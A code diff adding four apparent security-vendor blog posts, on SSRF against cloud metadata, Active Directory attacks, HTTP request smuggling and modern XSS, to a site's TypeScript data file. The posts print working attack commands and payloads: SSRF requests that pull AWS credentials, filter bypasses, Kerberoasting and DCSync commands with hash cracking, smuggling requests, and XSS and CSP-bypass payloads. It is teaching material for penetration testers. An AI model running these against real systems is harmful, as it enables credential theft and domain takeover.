@@ -1,4 +1,4 @@
-export type BlogCodeBlock = {
+﻿export type BlogCodeBlock = {
   language: string;
   caption?: string;
   content: string;
@@ -1076,7 +1076,428 @@ export const blogPosts: BlogArticle[] = [
       "ai-autonomous-hacking-2026",
     ],
   },
-];
+  // ── NEW POST 1: SSRF 2026 ─────────────────────────────────────────────────
+  {
+    slug: "ssrf-2026-cloud-metadata-exploitation",
+    title: "SSRF in 2026: Cloud Metadata Exploitation and Blind Detection Techniques",
+    description:
+      "A deep technical guide to Server-Side Request Forgery in 2026, covering cloud metadata endpoints, blind SSRF via OOB, filter bypass techniques, and how to chain SSRF into credential theft.",
+    excerpt:
+      "SSRF is still one of the highest-impact bugs in cloud-hosted applications. The attack surface keeps growing as apps add URL-fetching features, and the impact keeps rising as cloud metadata endpoints hand out temporary credentials.",
+    publishedAt: "2026-04-14",
+    updatedAt: "2026-04-21",
+    readTime: "13 min read",
+    category: "Web Security",
+    categoryColor: "#f472b6",
+    image: "/blog/operator-surface.svg",
+    imageAlt: "Server-side request flow diagram showing internal metadata endpoint access.",
+    tags: ["ssrf", "cloud security", "aws metadata", "blind ssrf", "2026"],
+    basedOn: ["Security research", "CVE database", "Bug bounty reports"],
+    takeaways: [
+      "Cloud metadata endpoints remain the highest-impact SSRF target in 2026.",
+      "Blind SSRF via OOB callbacks is the most common real-world variant.",
+      "Filter bypass via DNS rebinding and URL parser confusion still works on many targets.",
+    ],
+    sections: [
+      {
+        title: "Why SSRF impact keeps growing",
+        paragraphs: [
+          "Every new feature that fetches a URL server-side is a potential SSRF surface. In 2026, that list includes AI summarization endpoints, webhook verification, document import, image proxying, feed aggregation, and OAuth callback validation. Each one can become a pivot into internal infrastructure if input validation is weak.",
+          "The impact ceiling rose with cloud adoption. When an application runs on AWS, GCP, or Azure, a successful SSRF can reach the instance metadata service and return temporary credentials, IAM role names, and internal network topology — all without any authentication."
+        ],
+        bullets: [
+          "AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "GCP metadata: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+          "Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "Oracle Cloud: http://169.254.169.254/opc/v1/instance/",
+        ],
+      },
+      {
+        title: "Finding SSRF surfaces",
+        paragraphs: [
+          "The fastest way to find SSRF candidates is to look for any parameter that accepts a URL, hostname, IP, or path that the server will fetch. Common parameter names include url, link, src, href, path, redirect, callback, webhook, feed, import, and fetch.",
+          "Beyond obvious URL parameters, look for indirect surfaces: PDF generators that render HTML from a URL, image resizers that fetch remote images, integrations that ping a user-supplied webhook, and OAuth flows that validate redirect URIs by fetching them."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "Quick SSRF surface discovery with ffuf",
+            content:
+              "# Fuzz for URL-accepting parameters\nffuf -u 'https://target.com/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt\n\n# Test known SSRF params\nfor param in url link src href path redirect callback webhook; do\n  curl -s \"https://target.com/fetch?${param}=https://your-oob-server.com/${param}\" &\ndone",
+          },
+        ],
+      },
+      {
+        title: "Blind SSRF: OOB detection",
+        paragraphs: [
+          "Most real-world SSRF is blind — the server makes the request but the response is not returned to the attacker. Detection requires out-of-band callbacks. The server fetches your URL, your OOB server logs the request, and you have proof of SSRF even without seeing the response.",
+          "Tools like interactsh, Burp Collaborator, and canarytokens.org provide OOB infrastructure. The key is to use a unique subdomain per test so you can correlate callbacks to specific payloads."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "OOB SSRF test with interactsh",
+            content:
+              "# Start interactsh client\ninteractsh-client -v\n\n# Use the generated URL in your SSRF payload\ncurl -s 'https://target.com/api/fetch' \\\n  -d '{\"url\":\"http://YOUR-ID.oast.pro/ssrf-test\"}'\n\n# Check interactsh output for DNS/HTTP callbacks",
+          },
+        ],
+      },
+      {
+        title: "Filter bypass techniques",
+        paragraphs: [
+          "Most applications implement SSRF filters by blocking known metadata IPs (169.254.169.254) or requiring HTTPS. These filters are often bypassable through URL parser confusion, DNS rebinding, and encoding tricks.",
+          "The most reliable bypass in 2026 is DNS rebinding: register a domain that first resolves to a legitimate IP (passing the filter), then rebinds to 169.254.169.254 before the actual request is made. This works when the application validates the URL at parse time but fetches at a different time."
+        ],
+        bullets: [
+          "Decimal IP: http://2130706433/ (127.0.0.1 in decimal)",
+          "Octal IP: http://0177.0.0.1/ (127.0.0.1 in octal)",
+          "IPv6: http://[::1]/ or http://[::ffff:169.254.169.254]/",
+          "URL encoding: http://169.254.169.254%2F",
+          "DNS rebinding: use rbndr.us or singularity for automated rebinding",
+          "Redirect chain: your server returns 302 to 169.254.169.254",
+        ],
+      },
+      {
+        title: "Chaining SSRF to credential theft",
+        paragraphs: [
+          "Once you confirm SSRF to the metadata endpoint, the next step is to extract credentials. On AWS with IMDSv1, a single request returns the IAM role name, and a second request returns the access key, secret key, and session token.",
+          "With those credentials you can enumerate S3 buckets, describe EC2 instances, list IAM policies, and potentially escalate to full account compromise. This is why SSRF-to-metadata is consistently rated critical in bug bounty programs."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "AWS credential extraction via SSRF",
+            content:
+              "# Step 1: Get IAM role name\ncurl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# Returns: MyEC2Role\n\n# Step 2: Get credentials\ncurl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role'\n# Returns: AccessKeyId, SecretAccessKey, Token\n\n# Step 3: Use credentials\nAWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 ls",
+          },
+        ],
+        note: "Only test on targets where you have explicit written authorization. Unauthorized access to cloud credentials is a serious crime in most jurisdictions.",
+      },
+    ],
+    faq: [
+      {
+        question: "What is the difference between SSRF and blind SSRF?",
+        answer:
+          "In regular SSRF, the server response is returned to the attacker. In blind SSRF, the server makes the request but the response is not visible — detection requires out-of-band callbacks.",
+      },
+      {
+        question: "Does IMDSv2 prevent SSRF on AWS?",
+        answer:
+          "IMDSv2 requires a PUT request with a TTL header to get a session token before accessing metadata. This prevents most SSRF attacks because SSRF typically only allows GET requests. However, if the application makes PUT requests or if IMDSv2 is not enforced, SSRF can still work.",
+      },
+    ],
+    references: [
+      { label: "PortSwigger SSRF Guide", href: "https://portswigger.net/web-security/ssrf" },
+      { label: "HackTricks SSRF", href: "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" },
+    ],
+    cta: { label: "Try CyberMind SSRF detection", href: "/features" },
+    relatedSlugs: ["owasp-top-10-2026-testing-guide", "api-security-testing-2026", "http-request-smuggling-2026"],
+  },
+
+  // ── NEW POST 2: Active Directory 2026 ────────────────────────────────────
+  {
+    slug: "active-directory-attacks-2026",
+    title: "Active Directory Attacks in 2026: Kerberoasting, DCSync, and Modern AD Exploitation",
+    description:
+      "A technical guide to Active Directory attack techniques in 2026, covering Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash, BloodHound path analysis, and modern detection evasion.",
+    excerpt:
+      "Active Directory remains the backbone of enterprise identity. Attackers who understand Kerberos, LDAP, and trust relationships can move from a single compromised workstation to domain admin in hours.",
+    publishedAt: "2026-04-12",
+    updatedAt: "2026-04-21",
+    readTime: "14 min read",
+    category: "Red Team",
+    categoryColor: "#ef4444",
+    image: "/blog/omega-planner.svg",
+    imageAlt: "Active Directory attack path graph showing lateral movement from workstation to domain controller.",
+    tags: ["active directory", "kerberoasting", "dcsync", "red team", "2026"],
+    basedOn: ["Security research", "Red team engagements", "MITRE ATT&CK"],
+    takeaways: [
+      "Kerberoasting and AS-REP Roasting are still the fastest paths to privileged credentials.",
+      "BloodHound path analysis reveals attack paths that manual enumeration misses.",
+      "DCSync requires Domain Admin or equivalent — it is the endgame, not the entry point.",
+    ],
+    sections: [
+      {
+        title: "Why AD is still the primary enterprise target",
+        paragraphs: [
+          "Active Directory controls authentication, authorization, and group policy for most enterprise environments. A domain admin account is effectively a master key to every Windows system in the organization. That is why AD compromise is the goal of most internal penetration tests and red team engagements.",
+          "In 2026, hybrid environments (on-prem AD + Azure AD / Entra ID) have expanded the attack surface. Techniques that work on-prem often have cloud equivalents, and trust relationships between the two environments create new lateral movement paths."
+        ],
+      },
+      {
+        title: "Kerberoasting: extracting service account hashes",
+        paragraphs: [
+          "Kerberoasting exploits the Kerberos protocol to extract password hashes for service accounts. Any authenticated domain user can request a Kerberos service ticket (TGS) for any service principal name (SPN). The ticket is encrypted with the service account's NTLM hash, which can be cracked offline.",
+          "The attack is silent from a network perspective — requesting service tickets is normal Kerberos behavior. Detection requires monitoring for unusual TGS requests, particularly for accounts with weak passwords."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "Kerberoasting with Impacket",
+            content:
+              "# Get all kerberoastable accounts\npython3 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -request\n\n# Output: hashes in $krb5tgs$23$* format\n# Crack with hashcat\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force",
+          },
+        ],
+      },
+      {
+        title: "AS-REP Roasting: no credentials needed",
+        paragraphs: [
+          "AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. Without pre-auth, an attacker can request an AS-REP for any username and receive a response encrypted with the user's password hash — no credentials required.",
+          "This is particularly dangerous for service accounts and legacy accounts where pre-auth was disabled for compatibility reasons."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "AS-REP Roasting without credentials",
+            content:
+              "# Enumerate accounts without pre-auth\npython3 GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass\n\n# Crack the AS-REP hash\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
+          },
+        ],
+      },
+      {
+        title: "BloodHound: mapping attack paths",
+        paragraphs: [
+          "BloodHound uses graph theory to map relationships between AD objects and identify attack paths to high-value targets. It ingests data from SharpHound (Windows) or BloodHound.py (Linux) and visualizes paths like: compromised user → group membership → ACL → domain admin.",
+          "The most valuable BloodHound queries find shortest paths to Domain Admins, accounts with DCSync rights, and Kerberos delegation misconfigurations."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "BloodHound data collection",
+            content:
+              "# Collect from Linux (no agent needed)\npython3 bloodhound.py -u user -p password -d DOMAIN -dc 10.10.10.1 -c All\n\n# Import JSON files into BloodHound\n# Then run: Find Shortest Paths to Domain Admins",
+          },
+        ],
+      },
+      {
+        title: "DCSync: dumping the entire domain",
+        paragraphs: [
+          "DCSync abuses the Directory Replication Service (DRS) protocol to request password hashes for any account, including krbtgt and all domain admins. It requires the Replicating Directory Changes All privilege, which is held by Domain Admins and can be granted via ACL abuse.",
+          "A successful DCSync gives you the NTLM hash of every account in the domain, enabling Pass-the-Hash attacks against any system."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "DCSync with Impacket secretsdump",
+            content:
+              "# Dump all hashes via DCSync\npython3 secretsdump.py DOMAIN/admin:password@10.10.10.1\n\n# Or with just the krbtgt hash (for Golden Ticket)\npython3 secretsdump.py DOMAIN/admin:password@10.10.10.1 -just-dc-user krbtgt",
+          },
+        ],
+        note: "DCSync requires Domain Admin or equivalent privileges. It is the endgame technique, not the entry point. Use BloodHound to find the path to those privileges first.",
+      },
+    ],
+    faq: [
+      {
+        question: "What is the difference between Pass-the-Hash and Pass-the-Ticket?",
+        answer:
+          "Pass-the-Hash uses an NTLM hash to authenticate to services that accept NTLM. Pass-the-Ticket uses a Kerberos ticket (TGT or TGS) to authenticate to Kerberos-enabled services. Both allow lateral movement without knowing the plaintext password.",
+      },
+    ],
+    references: [
+      { label: "MITRE ATT&CK: Kerberoasting", href: "https://attack.mitre.org/techniques/T1558/003/" },
+      { label: "BloodHound GitHub", href: "https://github.com/BloodHoundAD/BloodHound" },
+    ],
+    cta: { label: "Explore CyberMind red team features", href: "/features" },
+    relatedSlugs: ["bug-bounty-automation-workflow-2026", "ai-autonomous-hacking-2026", "owasp-top-10-2026-testing-guide"],
+  },
+
+  // ── NEW POST 3: HTTP Smuggling 2026 ──────────────────────────────────────
+  {
+    slug: "http-request-smuggling-2026",
+    title: "HTTP Request Smuggling in 2026: CL.TE, TE.CL, and H2 Desync Attacks",
+    description:
+      "A complete technical guide to HTTP request smuggling in 2026, covering CL.TE and TE.CL variants, HTTP/2 desync, detection with Burp Suite and nuclei, and real-world impact chains.",
+    excerpt:
+      "HTTP request smuggling exploits disagreements between front-end and back-end servers about where one request ends and the next begins. In 2026, H2 desync has expanded the attack surface to virtually every modern CDN-backed application.",
+    publishedAt: "2026-04-10",
+    updatedAt: "2026-04-21",
+    readTime: "12 min read",
+    category: "Web Security",
+    categoryColor: "#f472b6",
+    image: "/blog/aegis-graph.svg",
+    imageAlt: "HTTP request flow diagram showing desync between front-end proxy and back-end server.",
+    tags: ["http smuggling", "desync", "h2 smuggling", "web security", "2026"],
+    basedOn: ["PortSwigger research", "Bug bounty reports", "CVE database"],
+    takeaways: [
+      "HTTP/2 desync (H2.CL and H2.TE) is the most impactful smuggling variant in 2026.",
+      "Smuggling can bypass WAFs, poison caches, and capture other users' requests.",
+      "Detection requires timing-based probes — passive scanning misses most smuggling vulnerabilities.",
+    ],
+    sections: [
+      {
+        title: "What is HTTP request smuggling",
+        paragraphs: [
+          "HTTP request smuggling exploits ambiguity in how HTTP/1.1 handles message boundaries. When a front-end proxy and back-end server disagree about where one request ends, an attacker can smuggle a partial request that gets prepended to the next legitimate user's request.",
+          "The impact ranges from bypassing security controls and WAFs to capturing authentication tokens from other users' requests — effectively a server-side request injection."
+        ],
+      },
+      {
+        title: "CL.TE: Content-Length front, Transfer-Encoding back",
+        paragraphs: [
+          "In CL.TE smuggling, the front-end uses Content-Length to determine request boundaries while the back-end uses Transfer-Encoding. The attacker sends a request where both headers are present but conflict, causing the back-end to treat the remainder as the start of the next request."
+        ],
+        codeBlocks: [
+          {
+            language: "http",
+            caption: "CL.TE smuggling payload",
+            content:
+              "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
+          },
+        ],
+      },
+      {
+        title: "TE.CL: Transfer-Encoding front, Content-Length back",
+        paragraphs: [
+          "In TE.CL smuggling, the front-end uses Transfer-Encoding while the back-end uses Content-Length. The attacker crafts a chunked request where the chunk size causes the back-end to read only part of the body, leaving the rest to be prepended to the next request."
+        ],
+        codeBlocks: [
+          {
+            language: "http",
+            caption: "TE.CL smuggling payload",
+            content:
+              "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
+          },
+        ],
+      },
+      {
+        title: "H2 desync: the 2026 frontier",
+        paragraphs: [
+          "HTTP/2 uses binary framing with explicit length fields, so there is no ambiguity in H2-to-H2 communication. The vulnerability arises when an H2 front-end downgrades to HTTP/1.1 for the back-end connection. If the H2 request contains a Content-Length or Transfer-Encoding header that conflicts with the H2 frame length, the back-end can be desynchronized.",
+          "H2.CL and H2.TE variants affect virtually every CDN that terminates H2 and proxies to HTTP/1.1 back-ends — which is most of them. This makes H2 desync the highest-impact smuggling variant in 2026."
+        ],
+        codeBlocks: [
+          {
+            language: "bash",
+            caption: "H2 desync detection with Burp Suite",
+            content:
+              "# Use Burp Suite HTTP Request Smuggler extension\n# Or use the built-in HTTP/2 smuggling scanner in Burp Pro\n# Manual: send H2 request with Content-Length: 0 and body\n# If timing differs from baseline, desync is likely",
+          },
+        ],
+      },
+      {
+        title: "Impact chains",
+        paragraphs: [
+          "The most impactful smuggling chains in 2026 are: WAF bypass (smuggle a malicious request past the WAF), cache poisoning (poison the CDN cache with a malicious response), and request capture (steal another user's session token by prepending a partial request to their next request).",
+          "Request capture is the most dangerous because it requires no interaction from the victim beyond making a normal request to the application."
+        ],
+        bullets: [
+          "WAF bypass: smuggle SQLi or XSS past the WAF inspection layer.",
+          "Cache poisoning: poison CDN cache with attacker-controlled response.",
+          "Request capture: steal session tokens from other users.",
+          "Response queue poisoning: cause other users to receive attacker-controlled responses.",
+        ],
+      },
+    ],
+    faq: [
+      {
+        question: "How do I detect HTTP request smuggling?",
+        answer:
+          "Use timing-based detection: send a CL.TE or TE.CL probe and measure the response time. If the back-end is waiting for more data, the response will be delayed. Burp Suite's HTTP Request Smuggler extension automates this. Nuclei also has smuggling templates.",
+      },
+    ],
+    references: [
+      { label: "PortSwigger: HTTP Request Smuggling", href: "https://portswigger.net/web-security/request-smuggling" },
+      { label: "HTTP/2 Desync Research", href: "https://portswigger.net/research/http2" },
+    ],
+    cta: { label: "Try CyberMind smuggling detection", href: "/features" },
+    relatedSlugs: ["ssrf-2026-cloud-metadata-exploitation", "owasp-top-10-2026-testing-guide", "api-security-testing-2026"],
+  },
+
+  // ── NEW POST 4: XSS 2026 ─────────────────────────────────────────────────
+  {
+    slug: "xss-attacks-2026-modern-techniques",
+    title: "XSS in 2026: DOM Clobbering, Prototype Pollution, and CSP Bypass Techniques",
+    description:
+      "A modern XSS guide for 2026 covering DOM-based XSS, prototype pollution chains, CSP bypass via JSONP and Angular, mutation XSS in sanitizers, and how to write bounty-grade XSS reports.",
+    excerpt:
+      "Reflected XSS is mostly caught by scanners now. The high-value XSS in 2026 lives in DOM sinks, prototype pollution chains, CSP misconfigurations, and trusted-type bypasses that require manual analysis.",
+    publishedAt: "2026-04-08",
+    updatedAt: "2026-04-21",
+    readTime: "11 min read",
+    category: "Web Security",
+    categoryColor: "#f472b6",
+    image: "/blog/editor-grid.svg",
+    imageAlt: "Browser DOM tree with highlighted XSS injection points.",
+    tags: ["xss", "dom xss", "csp bypass", "prototype pollution", "2026"],
+    basedOn: ["Security research", "Bug bounty reports", "PortSwigger research"],
+    takeaways: [
+      "DOM-based XSS in JavaScript frameworks is the highest-value XSS class in 2026.",
+      "CSP bypass via JSONP endpoints and Angular template injection still works on many targets.",
+      "Prototype pollution to XSS chains are underreported and often rated high/critical.",
+    ],
+    sections: [
+      {
+        title: "Why reflected XSS is mostly dead",
+        paragraphs: [
+          "Modern browsers, WAFs, and framework-level output encoding have made classic reflected XSS rare in well-maintained applications. The XSS that pays in 2026 requires understanding JavaScript execution contexts, DOM sinks, and the specific sanitization logic of the target.",
+          "That shift means the best XSS hunters are JavaScript readers, not payload spammers."
+        ],
+      },
+      {
+        title: "DOM-based XSS: finding dangerous sinks",
+        paragraphs: [
+          "DOM XSS occurs when JavaScript reads attacker-controlled data from a source (location.hash, location.search, document.referrer, postMessage) and writes it to a dangerous sink (innerHTML, eval, document.write, location.href, setTimeout with string argument).",
+          "The fastest way to find DOM XSS is to search the JavaScript for dangerous sinks and trace the data flow back to a controllable source."
+        ],
+        codeBlocks: [
+          {
+            language: "javascript",
+            caption: "Common DOM XSS sink patterns to search for",
+            content:
+              "// Dangerous sinks\ndocument.getElementById('x').innerHTML = location.hash.slice(1);\neval(location.search.split('code=')[1]);\ndocument.write(decodeURIComponent(location.hash));\nwindow.location = userInput; // open redirect -> XSS\nsetTimeout(userInput, 1000); // string eval",
+          },
+        ],
+      },
+      {
+        title: "Prototype pollution to XSS",
+        paragraphs: [
+          "Prototype pollution occurs when an attacker can set properties on Object.prototype via a merge, clone, or path-assignment function. If the application later reads from Object.prototype in a dangerous context, this can lead to XSS.",
+          "The chain is: find a prototype pollution gadget (usually in a deep merge function), find a downstream sink that reads from Object.prototype, and craft a payload that connects them."
+        ],
+        codeBlocks: [
+          {
+            language: "javascript",
+            caption: "Prototype pollution XSS chain",
+            content:
+              "// Pollution via URL: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>\n// If the app does: element.innerHTML = options.innerHTML || ''\n// And options inherits from Object.prototype\n// Then the polluted value reaches the sink\n\n// Test with:\nObject.prototype.innerHTML = '<img src=x onerror=alert(1)>';\n// Then trigger the code path that reads innerHTML from an options object",
+          },
+        ],
+      },
+      {
+        title: "CSP bypass techniques",
+        paragraphs: [
+          "Content Security Policy is the main defense against XSS. Bypasses exist when the policy allows unsafe-inline, unsafe-eval, or overly broad source directives. The most reliable bypasses in 2026 are JSONP endpoints on whitelisted domains, Angular template injection on sites that allow angular.js CDN, and base-uri injection.",
+          "If the CSP allows a CDN domain that hosts JSONP endpoints, you can load a script from that domain with a callback parameter that executes your payload."
+        ],
+        bullets: [
+          "JSONP bypass: find a JSONP endpoint on a whitelisted domain.",
+          "Angular template injection: if angular.js is allowed, use {{constructor.constructor('alert(1)')()}}.",
+          "base-uri injection: if base-uri is not set, inject a base tag to redirect relative script loads.",
+          "Trusted Types bypass: find a policy that allows dangerous patterns.",
+        ],
+      },
+      {
+        title: "Writing a bounty-grade XSS report",
+        paragraphs: [
+          "A good XSS report includes: the exact URL and parameter, the payload used, a screenshot or video of the alert, the impact (session theft, credential capture, account takeover), and a remediation recommendation.",
+          "The difference between a $200 and a $2000 XSS report is usually the impact narrative. Show what an attacker can actually do with the XSS, not just that an alert box appeared."
+        ],
+      },
+    ],
+    faq: [
+      {
+        question: "Is XSS still worth reporting in 2026?",
+        answer:
+          "Yes, especially DOM-based XSS, stored XSS, and XSS that bypasses CSP. Reflected XSS without impact is often rated low, but any XSS that can steal session tokens, capture credentials, or perform actions on behalf of the victim is still rated high or critical.",
+      },
+    ],
+    references: [
+      { label: "PortSwigger DOM XSS", href: "https://portswigger.net/web-security/cross-site-scripting/dom-based" },
+      { label: "Prototype Pollution Research", href: "https://portswigger.net/research/server-side-prototype-pollution" },
+    ],
+    cta: { label: "Try CyberMind XSS detection", href: "/features" },
+    relatedSlugs: ["owasp-top-10-2026-testing-guide", "api-security-testing-2026", "ssrf-2026-cloud-metadata-exploitation"],
+  },];
 
 export function getBlogPost(slug: string) {
   return blogPosts.find((post) => post.slug === slug);
@@ -1085,3 +1506,4 @@ export function getBlogPost(slug: string) {
 export function getRelatedBlogPosts(slugs: string[]) {
   return slugs.map((slug) => getBlogPost(slug)).filter(Boolean) as BlogArticle[];
 }
+
